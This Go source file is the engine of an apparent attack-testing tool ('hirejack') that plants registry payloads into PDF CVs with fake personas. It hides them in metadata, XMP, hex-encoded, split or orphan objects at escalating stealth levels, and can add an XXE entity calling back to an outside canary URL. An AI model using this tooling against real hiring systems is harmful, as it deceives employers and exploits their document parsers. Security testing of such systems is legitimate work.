// Package engine orchestrates payload injection into PDFs.
package engine

import (
	"fmt"

	"github.com/novusedge/hirejack/internal/canary"
	"github.com/novusedge/hirejack/internal/encoders"
	"github.com/novusedge/hirejack/internal/generators"
	"github.com/novusedge/hirejack/internal/injectors"
	"github.com/novusedge/hirejack/internal/payloads"
	"github.com/novusedge/hirejack/internal/pdf"
)

// StealthLevel defines how hidden payloads are.
type StealthLevel int

const (
	StealthNone   StealthLevel = 0 // Raw payloads
	StealthBasic  StealthLevel = 1 // Metadata only
	StealthHex    StealthLevel = 2 // Hex encoding
	StealthSplit  StealthLevel = 3 // Split across locations
	StealthOrphan StealthLevel = 4 // Orphan objects
	StealthMax    StealthLevel = 5 // All techniques combined
)

// Engine orchestrates payload injection.
type Engine struct {
	canaryStore *canary.Store
	canaryURL   string
	stealth     StealthLevel

	metaInjector   *injectors.MetadataInjector
	xmpInjector    *injectors.XMPInjector
	orphanInjector *injectors.OrphanInjector
	hexEncoder     *encoders.HexEncoder
	splitEncoder   *encoders.SplitEncoder
	personaGen     *generators.PersonaGenerator
	cvGen          *generators.CVGenerator
}

// New creates a new engine.
func New(canaryURL string) *Engine {
	return &Engine{
		canaryStore:    canary.NewStore(),
		canaryURL:      canaryURL,
		stealth:        StealthBasic,
		metaInjector:   injectors.NewMetadataInjector(),
		xmpInjector:    injectors.NewXMPInjector(),
		orphanInjector: injectors.NewOrphanInjector(),
		hexEncoder:     encoders.NewHexEncoder(),
		splitEncoder:   encoders.NewSplitEncoder(),
		personaGen:     generators.NewPersonaGenerator(),
		cvGen:          generators.NewCVGenerator(nil),
	}
}

// SetStealth sets the stealth level.
func (e *Engine) SetStealth(level StealthLevel) {
	e.stealth = level
}

// InjectRequest specifies what to inject.
type InjectRequest struct {
	PDF         []byte           `json:"pdf"`          // Source PDF
	PayloadIDs  []string         `json:"payload_ids"`  // From registry
	ProfileID   string           `json:"profile_id"`   // Or use a profile
	CustomData  map[string]string `json:"custom_data"` // Custom fields
	Stealth     StealthLevel     `json:"stealth"`      // Override stealth
	AddCanary   bool             `json:"add_canary"`   // Add canary token
	CanaryLabel string           `json:"canary_label"` // Label for canary
}

// InjectResult contains the modified PDF and metadata.
type InjectResult struct {
	PDF         []byte           `json:"pdf"`
	Injections  []InjectionPoint `json:"injections"`
	CanaryToken *canary.Token    `json:"canary_token,omitempty"`
}

// InjectionPoint describes where a payload was injected.
type InjectionPoint struct {
	Location string `json:"location"` // metadata, xmp, orphan
	Field    string `json:"field"`    // author, dc:creator, etc
	Payload  string `json:"payload"`  // What was injected
	Encoded  bool   `json:"encoded"`  // Was it encoded
}

// Inject applies payloads to a PDF.
func (e *Engine) Inject(req InjectRequest) (*InjectResult, error) {
	doc, err := pdf.Parse(req.PDF)
	if err != nil {
		return nil, fmt.Errorf("engine: parse: %w", err)
	}

	stealth := req.Stealth
	if stealth == 0 {
		stealth = e.stealth
	}

	result := &InjectResult{
		Injections: []InjectionPoint{},
	}

	// Get payloads
	payloadList := e.resolvePayloads(req)

	// Inject based on stealth level
	switch {
	case stealth >= StealthMax:
		e.injectMax(doc, payloadList, result)
	case stealth >= StealthOrphan:
		e.injectOrphan(doc, payloadList, result)
	case stealth >= StealthSplit:
		e.injectSplit(doc, payloadList, result)
	case stealth >= StealthHex:
		e.injectHex(doc, payloadList, result)
	default:
		e.injectBasic(doc, payloadList, result)
	}

	// Add canary if requested
	if req.AddCanary {
		token := e.canaryStore.Generate(e.canaryURL, req.CanaryLabel)
		e.xmpInjector.InjectXXE(doc,
			fmt.Sprintf(`<!ENTITY canary SYSTEM "%s">`, token.CallbackURL),
			"dc:creator",
		)
		result.CanaryToken = token
		result.Injections = append(result.Injections, InjectionPoint{
			Location: "xmp",
			Field:    "doctype",
			Payload:  "canary XXE",
		})
	}

	// Custom data
	if len(req.CustomData) > 0 {
		e.metaInjector.InjectMap(doc, req.CustomData)
		for k, v := range req.CustomData {
			result.Injections = append(result.Injections, InjectionPoint{
				Location: "metadata",
				Field:    k,
				Payload:  v,
			})
		}
	}

	result.PDF, err = doc.Bytes()
	if err != nil {
		return nil, fmt.Errorf("engine: write: %w", err)
	}

	return result, nil
}

// GenerateCV creates a new CV with payloads.
func (e *Engine) GenerateCV(payloadIDs []string, stealth StealthLevel) (*InjectResult, error) {
	persona := e.personaGen.Generate()
	doc, err := e.cvGen.GenerateWithContent(persona)
	if err != nil {
		return nil, fmt.Errorf("engine: gen cv: %w", err)
	}

	pdfBytes, err := doc.Bytes()
	if err != nil {
		return nil, err
	}

	return e.Inject(InjectRequest{
		PDF:        pdfBytes,
		PayloadIDs: payloadIDs,
		Stealth:    stealth,
	})
}

// CanaryStore returns the canary token store.
func (e *Engine) CanaryStore() *canary.Store {
	return e.canaryStore
}

func (e *Engine) resolvePayloads(req InjectRequest) []payloads.Payload {
	var list []payloads.Payload

	if req.ProfileID != "" {
		if profile := payloads.GetProfile(req.ProfileID); profile != nil {
			for _, id := range profile {
				if p := payloads.GetPayload(id); p != nil {
					list = append(list, *p)
				}
			}
		}
	}

	for _, id := range req.PayloadIDs {
		if p := payloads.GetPayload(id); p != nil {
			list = append(list, *p)
		}
	}

	return list
}

func (e *Engine) injectBasic(doc *pdf.PDF, plist []payloads.Payload, result *InjectResult) {
	for _, p := range plist {
		e.metaInjector.InjectField(doc, "Author", p.Template)
		result.Injections = append(result.Injections, InjectionPoint{
			Location: "metadata",
			Field:    "Author",
			Payload:  p.Template,
		})
	}
}

func (e *Engine) injectHex(doc *pdf.PDF, plist []payloads.Payload, result *InjectResult) {
	for _, p := range plist {
		encoded := e.hexEncoder.Encode(p.Template)
		e.metaInjector.InjectField(doc, "Author", encoded)
		result.Injections = append(result.Injections, InjectionPoint{
			Location: "metadata",
			Field:    "Author",
			Payload:  p.Template,
			Encoded:  true,
		})
	}
}

func (e *Engine) injectSplit(doc *pdf.PDF, plist []payloads.Payload, result *InjectResult) {
	fields := []string{"Author", "Title", "Subject", "Keywords", "Creator", "Producer"}

	for _, p := range plist {
		sr, _ := e.splitEncoder.SplitString(p.Template)
		for i, frag := range sr.Fragments {
			if i >= len(fields) {
				break
			}
			e.metaInjector.InjectField(doc, fields[i], string(frag.Content))
			result.Injections = append(result.Injections, InjectionPoint{
				Location: "metadata",
				Field:    fields[i],
				Payload:  string(frag.Content),
				Encoded:  true,
			})
		}
	}
}

func (e *Engine) injectOrphan(doc *pdf.PDF, plist []payloads.Payload, result *InjectResult) {
	for _, p := range plist {
		doc.CreateOrphanStream([]byte(p.Template))
		result.Injections = append(result.Injections, InjectionPoint{
			Location: "orphan",
			Payload:  p.Template,
		})
	}
}

func (e *Engine) injectMax(doc *pdf.PDF, plist []payloads.Payload, result *InjectResult) {
	// Combine all techniques
	for i, p := range plist {
		switch i % 4 {
		case 0:
			encoded := e.hexEncoder.Encode(p.Template)
			e.metaInjector.InjectField(doc, "Author", encoded)
			result.Injections = append(result.Injections, InjectionPoint{
				Location: "metadata", Field: "Author", Payload: p.Template, Encoded: true,
			})
		case 1:
			e.xmpInjector.Inject(doc, injectors.XMPConfig{Creator: p.Template})
			result.Injections = append(result.Injections, InjectionPoint{
				Location: "xmp", Field: "dc:creator", Payload: p.Template,
			})
		case 2:
			doc.CreateOrphanStream([]byte(p.Template))
			result.Injections = append(result.Injections, InjectionPoint{
				Location: "orphan", Payload: p.Template,
			})
		case 3:
			encoded := e.hexEncoder.EncodeAll(p.Template)
			e.metaInjector.InjectField(doc, "Subject", encoded)
			result.Injections = append(result.Injections, InjectionPoint{
				Location: "metadata", Field: "Subject", Payload: p.Template, Encoded: true,
			})
		}
	}
}
